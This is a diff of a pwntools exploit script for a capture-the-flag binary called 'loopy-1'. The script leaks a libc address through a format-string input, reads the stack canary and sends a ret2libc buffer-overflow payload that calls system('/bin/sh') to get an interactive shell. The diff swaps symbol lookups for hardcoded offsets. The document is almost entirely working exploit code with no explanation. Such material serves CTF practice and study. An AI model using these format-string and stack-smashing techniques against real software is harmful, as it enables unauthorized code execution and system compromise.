@@ -2,18 +2,22 @@
 
 from pwn import *
 
-
 libc = ELF('./libc.so.6')
 e = ELF('./loopy-1')
 p = process('./loopy-1')
-context.terminal = ['tmux', 'new-window']
+gdb.attach(p)
+
+#offsets
+leak_off = 0x1dad80
+bin_off = 0x17eaaa
+system_off = libc.symbols['system']
 
 #get addr
-bin_off = 0x17eaaa
 stk = e.got['__stack_chk_fail']
 vuln = e.symbols['vuln']
 main = e.symbols['main']
-fwrite_got = e.got['fwrite']
+fwrite_got = e.symbols['fwrite']
+print hex(fwrite_got)
 
 log.info('__stack_chk_fail: '+hex(stk))
 log.info('vuln: '+hex(vuln))
@@ -26,18 +30,18 @@ p.sendline(payload)
 
 #leak addr
 payload = ''
-payload+= p32(fwrite_got)
-payload+= '%7$s'
-p.sendlineafter('>', payload+'A'*(72-len(payload)))
+payload+= '%3$x'
+p.sendlineafter('>', payload+'A'*(76-len(payload)))
 p.recvuntil('You typed: ')
 p.recv(4)
-libc_base = u32(p.recv(4))-libc.symbols['fwrite']
+libc_base = u32(p.recv(4))
+print libc_base
 log.info('libc_base: '+hex(libc_base))
 
 #get system and binsh
-system = libc_base + libc.symbols['system']
+system = libc_base + system_off
 log.info('system: '+hex(system))
-binsh = libc_base + libc.search('/bin/sh').next()
+binsh = libc_base + bin_off
 log.info('/bin/sh :'+hex(binsh))
 
 #leak canary
@@ -53,11 +57,9 @@ log.info('Canary: '+hex(canary))
 payload = ''
 payload+= 'A'*64
 payload+= p32(canary)
-payload+= 'A'*12
+payload+= 'A'*16
 payload+= p32(system)
-payload+= 'BBBBBBB'
 payload+= p32(binsh)
 p.sendlineafter('>', payload)
 p.interactive()
 
-https://ctftime.org/writeup/16622
